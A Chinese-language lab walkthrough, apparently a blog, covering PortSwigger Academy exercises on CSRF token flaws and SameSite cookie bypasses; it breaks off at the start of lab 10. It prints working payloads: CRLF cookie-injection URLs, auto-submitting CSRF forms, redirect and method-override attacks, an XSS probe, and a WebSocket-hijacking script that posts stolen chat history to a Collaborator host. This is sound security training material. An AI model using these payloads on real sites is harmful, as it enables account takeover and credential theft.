3、Cookie设置行为甚至不需要存在于与 CSRF脆弱性。如果所控制的cookie具有合适的范围，则可以潜在地利用同一总体DNS域内的任何其他应用程序来在作为目标的应用程序中设置cookie。例如，上的Cookie设置功能 staging.demo.normal-website.com 可用于放置提交给的Cookie secure.normal-website.com<br/>  
<hr/>
4、涉及实验：
实验5：令牌绑定到非会话cookie的CSRF


---


> 
<h3>实验5：令牌绑定到非会话cookie的CSRF</h3>
信息：
1、本实验的电子邮件更改功能易受CSRF攻击。使用令牌来尝试防止CSRF攻击，但没有完全集成到站点的会话处理系统中。
2、解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址
3、已有账号：
wiener:peter
carlos:montoya
<hr/>
part1:
登录帐户，提交"更新电子邮件"表单，并在HTTP代理历史记录中查找生成的请求


将请求发送到Burp Repeater，并观察更改会话cookie会将您注销，但更改csrfKey cookie只会导致CSRF令牌被拒绝。这表明csrfKey Cookie可能没有严格绑定到会话



打开一个隐私/匿名浏览器窗口，登录到另一个帐户，并发送一个新的更新电子邮件请求到BP
如果将csrfKey cookie和csrf参数从第一个帐户交换到第二个帐户，则请求将被接受<br/> 关闭BP和隐私浏览器
<hr/>
part2:
回到原来的浏览器，执行搜索，将结果请求发送到Burp Repeater，观察搜索词是否反映在Set-Cookie头中。由于搜索功能没有CSRF保护，可以使用它将cookie注入受害用户的浏览器。


创建一个利用此漏洞将csrfKey Cookie注入受害者浏览器的URL：
<pre><code>/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None


我的是：
/?search=test%0d%0aSet-Cookie:%20csrfKey=3KgZOqo3BJRX4HkGlmX9ESGModd3Ch5J%3b%20SameSite=None</code></pre>
将原有的csrfKey置空后，通过在search中set-cookie


创建并托管概念利用验证，确保包含CSRF令牌。应通过电子邮件更改请求创建利用漏洞攻击
替换为以下代码来注入Cookie（需要csrfKey）
<pre><code>&lt;img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;


我的是：
&lt;img src="https://0a81005e04e2ac60c05b4019007800a9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=rFry4XfZMtkztI9YU4EERewPSwACRrLT%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;</code></pre>

<hr/>
part3:
生成插入的poc


此时的HTML还需要修改
将script标签中的内容换为上面的
<pre>`&lt;img src="https://0a81005e04e2ac60c05b4019007800a9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=3KgZOqo3BJRX4HkGlmX9ESGModd3Ch5J%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;`</pre>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0a81005e04e2ac60c05b4019007800a9.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="333333&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="hidden" name="csrf" value="rFry4XfZMtkztI9YU4EERewPSwACRrLT" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;



换完后：
&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0a81005e04e2ac60c05b4019007800a9.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="333333&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="hidden" name="csrf" value="rFry4XfZMtkztI9YU4EERewPSwACRrLT" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
        &lt;img src="https://0a81005e04e2ac60c05b4019007800a9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=3KgZOqo3BJRX4HkGlmX9ESGModd3Ch5J%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

存储利用漏洞攻击，然后单击"Deliver exploit to victim"（发给受害者）


 完成实验




---


> 
<h3>6、CSRF令牌只是在Cookie中复制</h3>
1、在上述漏洞的另一个变体中，某些应用程序不维护已发出令牌的任何服务器端记录，而是在Cookie和请求参数中复制每个令牌。验证后续请求时，应用程序只需验证请求参数中提交的令牌是否与Cookie中提交的值匹配。
<pre><code>这有时被称为针对CSRF的“双重提交”防御，因为它易于实现，并且不需要任何服务器端状态：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com</code></pre>
在这种情况下，如果网站包含任何Cookie设置功能，攻击者就可以再次执行CSRF攻击。在这里，攻击者不需要获得他们自己的有效令牌。只需发明一个令牌（可能是所需的格式，如果要检查的话），利用cookie设置行为将其cookie放置到受害者的浏览器中，并在CSRF攻击中将其令牌提供给受害者<br/>  
<hr/>
2、涉及实验：<br/> 实验6：标记在Cookie中重复的CSRF


> 
<h3>实验6：标记在Cookie中重复的CSRF</h3>
信息：
本实验的电子邮件更改功能易受CSRF攻击。它尝试使用不安全的"双重提交" CSRF预防技术。
完成实验：使用您的漏洞利用服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址
已有账号：wiener:peter
<hr/>
part1:
登录帐户。提交"更新电子邮件"表单，并在HTTP代理历史记录中查找生成的请求

 将请求发送到Burp Repeater，并观察到csrf body参数的值只是通过与csrf cookie进行比较来验证
（删除任意一个以后都会报400，少参数）



执行搜索，将结果请求发送到Burp Repeater，并观察搜索词是否反映在Set-Cookie报头中。由于搜索功能没有CSRF保护，可以使用它将cookie注入受害用户的浏览器


创建一个URL，利用此漏洞将伪造的csrf Cookie注入受害者的浏览器：
<pre><code>/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
</code></pre>
<hr/>
part2:
生成poc



<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0abf00ef04149dfdc6fb133800e000cc.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="333333&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="hidden" name="csrf" value="fake" /&gt;
      &lt;input type="hidden" name="" value="" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;

</code></pre>

按照无防御CSRF漏洞解决方案实验室中所述创建并托管概念利用验证，确保CSRF令牌设置为“假”。应通过电子邮件更改请求创建利用漏洞攻击。
删除&lt;script&gt;模块块，并改为以下代码来注入cookie并提交表单：
<pre><code>&lt;img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/&gt;

我的是：
&lt;img src="https://0abf00ef04149dfdc6fb133800e000cc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/&gt;</code></pre>
更改后的为（注意2处csrf值改为一致，任意值）
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0abf00ef04149dfdc6fb133800e000cc.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="333333&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="hidden" name="csrf" value="fake" /&gt;
      &lt;input type="hidden" name="" value="" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
        &lt;img src="https://0abf00ef04149dfdc6fb133800e000cc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/&gt;
  &lt;/body&gt;
&lt;/html&gt;


</code></pre>

<hr/>
part3:
完成实验
存储漏洞，然后单击“Deliver exploit to victim”（发给受害者）
 <img alt="" height="948" src="https://img-blog.csdnimg.cn/63a009c5e33645609f059c39c6baa616.png" width="1200"/>
完成实验



---


---


---


## 三、绕过SameSite Cookie限制

> 
<h3>1、简述：</h3>
1、SameSite是一种浏览器安全机制，用于确定何时将网站的Cookie包含在源自其他网站的请求中。SameSite Cookie限制提供了针对各种跨站点攻击的部分保护，包括CSRF、跨站点泄漏和一些CORS漏洞攻击。 


> 
<h3>2、SameSite Cookie的上下文中、网站</h3>
<br/> 在SameSite Cookie限制的上下文中，站点被定义为顶级域（TLD），通常类似于.com或.net，再加上一个附加级别的域名。这通常被称为TLD+1。
<hr/>
在确定请求是否为同一站点时，还考虑URL方案。这意味着从 http://app.example.com 到https://app.example.com的链接被大多数浏览器视为跨站点链接。 <br/>  



> 
<h3>3、站点和源之间的区别</h3>
1、站点和源之间的区别在于它们的范围;一个站点包含多个域名，而一个源只包含一个。尽管它们密切相关，但重要的是不要互换使用这两个术语，因为将两者混为一谈可能会带来严重的安全隐患。
<hr/>
2、如果两个URL共享完全相同的方案、域名和端口，则认为它们具有相同的来源。不过请注意，端口通常是从方案中推断出来的。 


 3、“站点”一词的具体性要低得多，因为它只说明了方案和域名的最后一部分。至关重要的是，这意味着跨源请求仍然可以是同一站点的，但不是相反

 这是一个重要的区别，因为这意味着任何允许任意JavaScript执行的漏洞都可以被滥用，以绕过属于同一站点的其他域上基于站点的防御


> 
<h3>3、SameSite工作原理</h3>
1、在引入SameSite机制之前，浏览器在每个请求中向发出它们的域发送Cookie，即使请求是由不相关的第三方网站触发的。SameSite的工作原理是使浏览器和网站所有者能够限制哪些跨网站请求（如果有）应包括特定的Cookie。这有助于减少用户遭受CSRF攻击的风险，CSRF攻击会诱使受害者的浏览器发出请求，从而在易受攻击的网站上触发有害操作。由于这些请求通常需要与受害者的身份验证会话关联的Cookie，因此如果浏览器不包含此Cookie，攻击将失败。
<hr/>
2、当前所有主流浏览器都支持SameSite限制级别：严格、松弛、无
<hr/>
3、开发人员可以为他们设置的每个Cookie手动配置限制级别，从而使他们能够更好地控制何时使用这些Cookie。为此只需将 相同站点 中的属性 设置Cookie响应报头及其首选值：
<pre>`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`</pre>
尽管这提供了一些针对CSRF攻击的保护，但这些限制都不能保证免疫
<hr/>
4、如果发布Cookie的网站没有明确设置SameSite属性，Chrome会默认自动应用Lax（松弛）限制。这意味着Cookie仅在满足特定条件的跨站点请求中发送，即使开发人员从未配置此行为
<hr/>
<pre><code>1、严格

如果cookie设置为SameSite=Strict属性，浏览器将不会在任何跨站点请求中发送它。简而言之，这意味着如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则不会包含Cookie。

建议在设置Cookie以使承载者能够修改数据或执行其他敏感操作（例如访问仅对经过身份验证的用户可用的特定页面）时使用此选项。

尽管这是最安全的选项，但在需要跨站点功能的情况下，它可能会对用户体验产生负面影响。 



2、松弛

不严格的SameSite限制意味着浏览器将在跨站点请求中发送Cookie，但前提是同时满足以下两个条件：
    请求使用GET方法。
    请求是由用户的顶级导航（如单击链接）产生的。
这意味着Cookie不包括在跨站点 后例如请求。作为 后请求通常用于执行修改数据或状态的操作（至少根据最佳实践），因此它们更有可能成为CSRF攻击的目标。

同样，Cookie也不包含在后台请求中，例如由脚本、iframe或对图像和其他资源的引用发起的请求。 




3、无

如果使用SameSite=None属性设置Cookie，则无论使用何种浏览器，都将有效地禁用SameSite限制。因此，浏览器将在所有请求中向发出此cookie的网站发送此cookie，即使是由完全无关的第三方网站触发的请求。

除Chrome外，这是主要浏览器的默认行为，如果没有 相同站点属性在设置Cookie时提供。

禁用SameSite是有正当理由的，例如，当cookie旨在从第三方上下文使用，并且不授予承载者对任何敏感数据或功能的访问权限时。跟踪cookie就是一个典型的例子。

如果遇到设置为SameSite=None或没有显式限制的cookie，则值得调查它是否有用。当Chrome首次采用“默认松弛”行为时，它的副作用是破坏了许多现有的网络功能。作为一个快速的解决方案，一些网站选择简单地禁用所有Cookie上的SameSite限制，包括可能敏感的Cookie。

使用设置Cookie时 相同站点=无 ，网站还必须包括 安全属性，该属性确保仅通过HTTPS在加密消息中发送Cookie。否则，浏览器将拒绝Cookie，并且不会设置Cookie。
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
</code></pre>



---


---


> 
<h3>4、使用GET请求绕过SameSite Lax限制</h3>
1、服务器并不总是挑剔它们是否收到 获取 或 后请求到给定端点，甚至是那些期望表单提交的端点。如果还使用 松弛 的会话cookie限制，无论是显式限制还是浏览器默认设置限制，仍然可以执行 CSRF攻击 通过引出 获取从受害者的浏览器发出的请求。
<pre><code>只要请求涉及顶级导航，浏览器仍将包含受害者的会话cookie。以下是发起此类攻击的最简单方法之一：
&lt;script&gt;
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000';
&lt;/script&gt;</code></pre>
即使不允许普通的GET请求，一些框架也提供了重写请求行中指定的方法的方法。
<pre><code>例如，Symfony支持表单中的_method参数，该参数优先于用于路由目的的普通方法：
&lt;form action="https://vulnerable-website.com/account/transfer-payment" method="POST"&gt;
    &lt;input type="hidden" name="_method" value="GET"&gt;
    &lt;input type="hidden" name="recipient" value="hacker"&gt;
    &lt;input type="hidden" name="amount" value="1000000"&gt;
&lt;/form&gt;</code></pre>
<hr/>
涉及实验：
实验7：通过方法覆盖绕过SameSite Lax



> 
<h3>实验7：通过方法覆盖绕过SameSite Lax</h3>
信息：
1、本实验的更改电子邮件功能易受CSRF攻击
2、完成实验：执行更改受害者电子邮件地址的CSRF攻击。应该使用提供的利用漏洞攻击服务器来承载攻击
3、已有账号：wiener:peter
<hr/>
part1:
1、登陆账号，更改电子邮件，在HTTP历史记录选项卡中找到
2、研究POST /my-account/change-email请求，注意到它不包含任何不可预测的令牌，因此如果可以绕过SameSite cookie限制，可能容易受到CSRF的攻击。



3、查看对POST /login请求的响应，网站在设置会话Cookie时没有明确指定任何SameSite限制。因此，浏览器将使用默认的Lax限制级别。
这意味着会话cookie将在跨站点GET请求中发送，只要它们涉及顶级导航。


<hr/>
part2: 
绕过SameSite限制
4、发送POST /my-account/change-email请求到BP的repeater
5、在Burp Repeater中，右键单击请求并选择Change request method（更改请求方法）。Burp会自动生成一个等价的GET请求。发送请求，观察只允许POST请求。


6、尝试通过向查询字符串添加_method参数来重写该方法：
<pre>`GET /my-account/change-email?email=foo%40web-security-academy.net&amp;_method=POST HTTP/1.1`</pre>
7、发送请求，注意到这似乎已被服务器接受。（在浏览器中，转到您的帐户页面，确认您的电子邮件地址已更改）

<hr/>
part3: 
完成实验
8、转到利用漏洞攻击服务器，在Body部分中，创建一个HTML/JavaScript有效负载，该有效负载会诱使查看者的浏览器发出恶意GET请求。必须导致顶级导航，以便包含会话cookie。
<pre><code>以下是一种可能的方法：
&lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST";
&lt;/script&gt;

我的是：
&lt;script&gt;
    document.location = "https://0ada004903795585c000272900bb00fe.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST";
&lt;/script&gt;</code></pre>
9、存储并查看您自己的漏洞（store）。确认此操作已成功更改您在目标站点上的电子邮件地址（view exploit）

 发送给victim解决实验




---


> 
<h3>5、使用现场小工具绕过SameSite限制</h3>
1、如果cookie设置了SameSite=Strict属性，浏览器将不会在任何跨站点请求中包含它。如果可以在同一站点中找到导致第二个请求的小工具，则可以绕过此限制。
<hr/>
2、一个可能的小工具是客户端重定向，它使用攻击者可控制的输入（如URL参数）动态构造重定向目标。
<hr/>
3、就浏览器而言，这些客户端重定向根本不是真正的重定向；所得到的请求仅被视为普通的独立请求。最重要的是，这是一个相同网站的请求，因此，将包括与该网站相关的所有Cookie，无论是否存在任何限制。
<hr/>
4、如果可以操纵这个小工具来引发恶意的第二个请求，那么就可以完全绕过任何SameSite cookie限制
<hr/>5、 
 服务器端重定向不可能进行等效攻击。在这种情况下，浏览器会识别出跟随重定向的请求最初是由跨站点请求引起的，因此它们仍然会应用适当的Cookie限制。
<hr/>
6、涉及实验：
实验8：通过客户端重定向绕过SameSite Strict


---


---


> 
<h3>实验8：通过客户端重定向绕过SameSite Strict</h3>
信息：
1、本实验的更改电子邮件功能易受CSRF攻击
2、完成实验：执行更改受害者电子邮件地址的CSRF攻击。应该使用提供的利用漏洞攻击服务器来承载攻击
3、已有账号：wiener:peter
<hr/>
part1:
登录帐户,并更改您的电子邮件地址,转到HTTP历史记录中


研究POST/my-account/change-email请求并注意到它不包含任何不可预测的令牌，因此如果可以绕过任何SameSite cookie限制，可能容易受到CSRF的攻击


查看对POST/login请求的响应。（网站在设置会话Cookie时明确指定了SameSite = Strict。这可防止浏览器在跨站点请求中包含这些Cookie）


<hr/>
part2:
在浏览器中，转到其中一篇博客文章并发表任意评论。注意到最初被发送到确认页面/post/comment/confirmation?postId=x，但几秒钟后，将返回到博客帖子。

自动跳回博客



在Burp中，转到代理历史记录，注意这个重定向是在客户端使用导入的JavaScript文件/resources/js/commentConfirmationRedirect.js处理的。
研究JavaScript并注意到它使用postId查询参数来动态构造客户端重定向的路径。



在代理历史记录中，右键单击GET/post/comment/confirmation?postId=x请求并选择复制URL。
在浏览器中，访问此URL，但将postId参数更改为任意字符串。/post/comment/confirmation?postId=foo
（这个是跳转处理前的评论成功请求）



然后再次跳转对应的链接（因为不存在，所以找不到）
但重定向是没有检查的



在客户端JavaScript尝试将重定向到包含注入字符串的路径（例如/post/foo）之前，最初看到的是post确认页面。
注入一个路径遍历序列，以便动态构建的重定向URL将指向帐户页面
<pre>`/post/comment/confirmation?postId=1/../../my-account`</pre>


观察浏览器是否正常化此URL并成功将您带到帐户页面。这确认可以使用postId参数来引发对目标站点上任意端点的GET请求


<hr/>
part3:
绕过SameSite限制
在浏览器中，转到漏洞利用服务器并创建一个脚本，该脚本诱导查看者的浏览器发送刚刚测试的GET请求。
<pre><code>以下是一种可能的方法：
&lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
&lt;/script&gt;

我的是：
&lt;script&gt;
    document.location = "https://0a2000fb033590aec1de715a0082005b.web-security-academy.net/post/comment/confirmation?postId=../my-account";
&lt;/script&gt;</code></pre>

存储(store)并查看漏洞（view exploit）


当客户端重定向发生时，仍然会看到登录帐户页面。这证实了浏览器在第二个请求中包含了已验证会话cookie，即使最初的评论提交请求是从任意外部站点发起的


<hr/>
part4:
利用，发送POST /my-account/change-email请求到BP
在Burp Repeater中，右键单击请求并选择Change request method（更改请求方法）。Burp会自动生成一个等价的GET请求。发送请求，注意到端点允许您使用GET请求更改电子邮件地址。



返回漏洞攻击服务器并更改漏洞攻击中的postId参数，以便重定向导致浏览器发送等效的GET请求来更改您的电子邮件地址：
<pre><code>&lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
&lt;/script&gt;

我的是：
&lt;script&gt;
    document.location = "https://0a2000fb033590aec1de715a0082005b.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
&lt;/script&gt;</code></pre>
需要包含submit参数和URL编码的和分隔符，以避免在初始设置请求中中断postId参数。
自己测试该漏洞（view exploit），并确认您已成功更改电子邮件地址。再将漏洞发送给victim

 完成实验




---


---


> 
<h3>6、通过易受攻击的同级域绕过SameSite限制</h3>
1、无论是在测试别人的网站还是尝试保护自己的网站，都必须记住，即使请求是跨源发出的，它仍然可以是同一个网站。
<hr/>
2、确保彻底审核所有可用的攻击面，包括任何同级域。特别是允许引发任意次要请求的漏洞，例如 XSS语言，可能会完全破坏基于站点的防御，使站点的所有域都暴露在跨站点攻击之下。
<hr/>
3、除了经典的CSRF之外，如果目标网站支持WebSocket，则此功能可能容易受到跨站点WebSocket劫持（CSWSH）的攻击，CSWSH本质上只是针对WebSocket握手的CSRF攻击。
<hr/>
4、涉及实验：
实验9：通过兄弟域严格绕过SameSite


---


> 
<h3>实验9：通过兄弟域严格绕过SameSite</h3>
信息：
1、本实验的实时聊天功能容易受到跨站点WebSocket劫持（CSWSH）的攻击
2、解决实验：登录受害者的账户.
3、使用提供的漏洞利用服务器执行CSWSH攻击，将受害者的聊天历史泄漏到默认Burp Collaborator服务器。聊天历史记录包含纯文本形式的登录凭据。
<hr/>
part1：
学习实时聊天功能


BP代理，进入实时聊天功能并发送几条消息，HTTP history中找到WebSocket握手请求
它不包含任何不可预测的令牌，因此如果可以绕过任何SameSite cookie限制，则可能容易受到CSWSH的攻击


在浏览器中，刷新实时聊天页面。
历史记录选项卡。刷新页时，浏览器会向服务器发送READY消息。这将导致服务器以整个聊天历史记录进行响应

<hr/>
part2:
确认CSWSH漏洞
转到Collaborator选项卡，然后复制到剪贴板

<pre>`fk3ogs2u3x8d3mfm0lw9gaglkcq2er.burpcollaborator.net`</pre>

转到利用漏洞攻击服务器并使用以下模板创建CSWSH概念验证脚本：
<pre><code>&lt;script&gt;
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;

我的是：
&lt;script&gt;
    var ws = new WebSocket('wss://0a0b005204975a91c040c25f005e0071.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://fk3ogs2u3x8d3mfm0lw9gaglkcq2er.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;</code></pre>
存储（store）和查看漏洞（view）
返回Collaborator选项卡并单击刷新。收到了一个HTTP交互，表明已经打开了一个与目标站点的新的实时聊天连接


尽管已经确认了CSWSH漏洞，但只是泄漏了一个全新会话的聊天历史记录，这并不是特别有用



HTTP history选项卡并找到由脚本触发的WebSocket握手请求。这应该是最近的GET/聊天请求。
会话cookie没有随请求一起发送。
在响应中，网站在设置会话cookie时显式指定了SameSite = Strict。这可防止浏览器在跨站点请求中包含这些Cookie
<hr/>
part3:
识别同一“站点”中的其他漏洞
阅览BP代理历史记录，注意对脚本和图像文件等资源请求的响应包含一个Access-Control-Allow-Origin头，它显示了一个兄弟域cms-YOUR-LAB-ID.web-security-academy.net

多了一个cms-
<pre>`https://cms-0a0b005204975a91c040c25f005e0071.web-security-academy.net`</pre>


在浏览器中，访问此新URL以发现其他登录表单


提交一些任意的登录凭据，然后观察用户名是否反映在Invalid username消息的响应中。
尝试通过username参数注入XSS有效负载
<pre>`&lt;script&gt;alert(1)&lt;/script&gt;`</pre>
观察到alert()被调用，确认这是一个可行的反射XSS



将包含XSS有效负载的POST /登录请求发送到Burp Repeater。
在Burp Repeater中，右键单击请求并选择Change request method（更改请求方法），将方法转换为GET。确认它仍然收到相同的响应


再次右键单击请求并选择复制URL。在浏览器中访问此URL并确认仍然可以触发XSS。由于此兄弟域是同一站点的一部分，因此可以使用此XSS来发起CSWSH攻击，而无需通过SameSite限制来缓解


<pre>`http://burp/show/3/wxagw5m9uqkkr2jbvtded0uy2tqww68s`</pre>


<hr/>
part4:
绕过SameSite限制    重新创建之前在利用漏洞攻击服务器上测试的CSWSH脚本。
<pre><code>&lt;script&gt;
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;

我的是：
&lt;script&gt;
    var ws = new WebSocket('wss://0a0b005204975a91c040c25f005e0071.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://au8jqncpdsi8dhphag64q5qgu70yon.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;</code></pre>

URL编码整个脚本

<pre>`%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket('wss%3A%2F%2F0a0b005204975a91c040c25f005e0071.web-security-academy.net%2Fchat')%3B%0A%20%20%20%20ws.onopen%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20ws.send(%22READY%22)%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function(event)%20%7B%0A%20%20%20%20%20%20%20%20fetch('https%3A%2F%2Fau8jqncpdsi8dhphag64q5qgu70yon.burpcollaborator.net'%2C%20%7Bmethod%3A%20'POST'%2C%20mode%3A%20'no-cors'%2C%20body%3A%20event.data%7D)%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E`</pre>

返回到利用漏洞攻击服务器并创建一个脚本，该脚本引导查看者的浏览器发送您刚刚测试的GET请求，但使用URL编码的CSWSH负载作为username参数。以下是一种可能的方法：
<pre><code>&lt;script&gt;
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&amp;password=anything";
&lt;/script&gt;

我的是：
&lt;script&gt;
    document.location = "https://cms-0a0b005204975a91c040c25f005e0071.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket('wss%3A%2F%2F0a0b005204975a91c040c25f005e0071.web-security-academy.net%2Fchat')%3B%0A%20%20%20%20ws.onopen%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20ws.send(%22READY%22)%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function(event)%20%7B%0A%20%20%20%20%20%20%20%20fetch('https%3A%2F%2Fau8jqncpdsi8dhphag64q5qgu70yon.burpcollaborator.net'%2C%20%7Bmethod%3A%20'POST'%2C%20mode%3A%20'no-cors'%2C%20body%3A%20event.data%7D)%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&amp;password=anything";
&lt;/script&gt;</code></pre>
存储（store）并查看自己能否触发漏洞（view）



返回Collaborator选项卡并刷新。收到了许多新的交互，其中包含整个聊天历史记录。

HTTP history选项卡并找到由脚本触发的WebSocket握手请求。这应该是最近的GET/聊天请求。
确认此请求确实包含您的会话Cookie。由于该请求是从易受攻击的兄弟域发起的，因此浏览器将其视为同一站点请求。
 <img alt="" height="842" src="https://img-blog.csdnimg.cn/c835641b14764be58fb0ac17f0ac69d1.png" width="906"/>


<hr/>
part5:
完成实验

登陆成功



---


---


> 
<h3>7、使用新发布的Cookie绕过SameSite Lax限制</h3>
1、cookie 松弛 SameSite限制通常不会跨站点发送 后请求，但也有一些例外
<hr/>
2、如果网站不包含 SameSite 设置Cookie时，Chrome会自动应用 松弛限制。但为了避免破坏单点登录（SSO）机制，它实际上并不在顶层的前120秒内强制执行这些限制 后请求。因此，存在两分钟的窗口，在此期间用户可能容易受到跨站点攻击
（此两分钟的窗口不适用于使用显式设置的Cookie 相同部位=松弛属性）
<hr/>
3、尝试在这么短的时间内发动攻击有点不切实际。另一方面，如果可以在站点上找到一个小工具，能够强制向受害者发送新的会话cookie，则可以在跟踪主要攻击之前抢先刷新他们的cookie。如完成一个基于OAuth的登录流程可能会导致每次都有一个新会话，因为OAuth服务不一定知道用户是否仍然登录到目标站点。
<hr/>
4、要触发cookie刷新而不需要受害者再次手动登录，需要使用顶级域名，以确保与其当前 开放认证包括会话。这带来了额外的挑战，因为需要将用户重定向回站点，以便可以发动CSRF攻击。
或者可以从新选项卡触发cookie刷新，这样浏览器在能够进行最终攻击之前不会离开页面。这种方法的一个小问题是浏览器会阻止弹出选项卡，除非它们是通过手动交互打开的。
<pre><code>如默认情况下，浏览器将阻止以下弹出窗口：
window.open('https://vulnerable-website.com/login/sso');

若要解决此问题，可以将语句包装在onclick事件处理程序中，如下所示：
window.onclick =()=&gt; {
    window.open('https://vulnerable-website.com/login/sso');
}

这样， window.open()方法只有在用户单击页面上的某个位置时才会被调用。 </code></pre>
<hr/>
5、涉及实验
实验10：通过cookie刷新绕过SameSite Lax



---


---


> 
<h3> 实验10：通过cookie刷新绕过SameSite Lax</h3>
信息：
1、本实验的更改电子邮件功能易受CSRF攻击
2、完成本实验：执行更改受害者电子邮件地址的CSRF攻击。应该使用提供的利用漏洞攻击服务器来承载攻击
3、已有账号：wiener:peter
<hr/>
part1:
帐户登录并更改电子邮件地址，HTTP历史记录中分析数据包


研究POST/my-account/change-email请求并注意到它不包含任何不可预测的令牌，因此如果可以绕过任何SameSite cookie限制，可能容易受到CSRF的攻击



查看GET /oauth-callback?code=[...]在OAuth流结束时请求。网站在设置会话Cookie时没有明确指定任何SameSite限制。因此，浏览器将使用默认的Lax限制级别



<hr/>
part2:
尝试CSRF攻击
